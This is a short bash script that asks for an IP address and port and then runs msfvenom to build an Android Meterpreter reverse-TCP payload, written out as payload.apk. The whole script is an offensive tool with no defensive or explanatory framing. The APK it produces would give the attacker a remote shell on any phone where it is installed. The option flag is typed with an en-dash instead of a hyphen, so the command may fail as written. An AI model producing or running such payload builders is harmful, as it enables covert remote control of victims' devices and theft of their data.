#!/bin/bash

    echo "Enter the PORT Number"
    read port
    echo "Enter the IP Address"
    read ip
    msfvenom –p android/meterpreter/reverse_tcp LHOST=$ip LPORT=$port R> payload.apk


